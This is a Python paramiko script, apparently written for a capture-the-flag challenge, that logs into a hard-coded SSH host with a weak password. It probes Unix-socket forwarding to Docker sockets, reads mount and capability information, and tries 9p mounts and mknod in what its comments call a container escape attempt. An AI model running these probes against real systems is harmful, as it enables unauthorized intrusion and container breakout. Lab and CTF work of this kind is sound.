import paramiko
import socket
import time
import sys
import struct

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def test_streamlocal_proper():
    """正确测试streamlocal"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试Unix socket转发...")
    
    sockets = [
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/run/host/notify",
    ]
    
    for sock_path in sockets:
        print(f"\n测试 {sock_path}:")
        try:
            # dest_addr 格式: (socket_path, reserved)
            channel = transport.open_channel(
                "direct-streamlocal@openssh.com",
                dest_addr=(sock_path,),
                src_addr=("", 0)
            )
            print("   连接成功!")
            channel.close()
        except paramiko.ChannelException as e:
            print(f"   通道错误: {e}")
        except Exception as e:
            print(f"   失败: {type(e).__name__}: {e}")
    
    ssh.close()

def test_forwarded_streamlocal():
    """测试反向Unix socket转发"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试反向Unix socket转发...")
    
    # 这会让服务器在指定路径创建socket，并转发连接给我们
    socket_paths = [
        "/tmp/test.sock",
        "/run/test.sock",
    ]
    
    for path in socket_paths:
        print(f"\n请求转发 {path}:")
        try:
            # global request: streamlocal-forward@openssh.com
            transport.global_request("streamlocal-forward@openssh.com", (path,))
            print("   成功")
        except Exception as e:
            print(f"   失败: {e}")
    
    ssh.close()

def analyze_dropbear_capabilities():
    """分析dropbear支持的功能"""
    
    print("[*] 分析dropbear能力...")
    print("""
    Dropbear是轻量级SSH实现，支持的功能比OpenSSH少：
    
    支持:
    - 密码认证
    - 公钥认证
    - direct-tcpip (端口转发)
    - 会话通道
    - sftp子系统 (通过外部程序)
    - 反向端口转发
    
    不支持/部分支持:
    - X11转发 (需要编译时启用)
    - agent转发 (需要编译时启用)  
    - streamlocal (Unix socket转发) - 这是OpenSSH特有的
    
    关键点: 如果streamlocal不支持，我们需要其他方法
    """)

def check_flag_mount_location():
    """检查flag挂载点"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 检查9p/virtio挂载信息...")
    
    # 检查virtio设备
    session = transport.open_session()
    session.exec_command("find /sys -name '*9p*' -o -name '*virtio*' 2>/dev/null | head -50")
    print(session.recv(8192).decode())
    
    # 检查可能的挂载标签
    session = transport.open_session()
    session.exec_command("cat /proc/mounts")
    mounts = session.recv(8192).decode()
    print("\n当前挂载:")
    print(mounts)
    
    # 尝试挂载9p
    print("\n[*] 尝试挂载9p...")
    session = transport.open_session()
    session.exec_command("mount -t 9p -o trans=virtio flag /mnt 2>&1")
    print(session.recv(4096).decode())
    
    # 检查/mnt
    session = transport.open_session()
    session.exec_command("ls -la /mnt")
    print(session.recv(4096).decode())
    
    ssh.close()

def check_capabilities_detailed():
    """详细检查容器能力"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 详细检查能力...")
    
    # 读取capabilities
    session = transport.open_session()
    session.exec_command("cat /proc/self/status")
    status = session.recv(8192).decode()
    
    for line in status.split('\n'):
        if 'cap' in line.lower() or 'seccomp' in line.lower():
            print(line)
    
    # 检查可用的系统调用
    print("\n[*] 测试关键系统调用...")
    
    tests = [
        ("mkdir /mnt/test", "mkdir"),
        ("mount -t proc none /tmp", "mount"),
        ("mknod /tmp/test c 1 3", "mknod"),
    ]
    
    for cmd, name in tests:
        session = transport.open_session()
        session.exec_command(f"{cmd} 2>&1")
        result = session.recv(1024).decode()
        print(f"{name}: {result.strip()}")
    
    ssh.close()

def try_escape_via_mount():
    """尝试通过挂载逃逸"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 尝试挂载逃逸...")
    
    # 题目说 flag 需要用这个命令挂载:
    # sudo mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt
    
    # 但我们没有sudo...让我们看看能否直接挂载
    session = transport.open_session()
    session.exec_command("mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt 2>&1")
    result = session.recv(4096).decode()
    print(f"挂载结果: {result}")
    
    # 检查是否有flag目录
    session = transport.open_session()
    session.exec_command("ls -la / | grep flag")
    print(session.recv(1024).decode())
    
    # 检查/dev
    session = transport.open_session()
    session.exec_command("ls -la /dev/ | head -30")
    print(session.recv(4096).decode())
    
    ssh.close()

def check_ssh_env():
    """检查SSH环境变量和配置"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 检查SSH相关信息...")
    
    # 获取SSH_CONNECTION等
    session = transport.open_session()
    session.get_pty()
    session.invoke_shell()
    
    time.sleep(0.5)
    if session.recv_ready():
        print(session.recv(4096).decode())
    
    session.send("echo $SSH_CONNECTION\n")
    time.sleep(0.5)
    print(session.recv(4096).decode())
    
    session.send("echo $SSH_CLIENT\n")
    time.sleep(0.5)
    print(session.recv(4096).decode())
    
    session.send("echo $SSH_ORIGINAL_COMMAND\n")
    time.sleep(0.5)
    print(session.recv(4096).decode())
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 深入SSH分析")
    print("="*60)
    
    analyze_dropbear_capabilities()
    
    print("\n[1] 测试streamlocal")
    test_streamlocal_proper()
    
    print("\n[2] 检查flag挂载")
    check_flag_mount_location()
    
    print("\n[3] 检查能力")
    check_capabilities_detailed()
    
    print("\n[4] 尝试挂载逃逸")
    try_escape_via_mount()
    
    print("\n[5] 检查SSH环境")
    check_ssh_env()
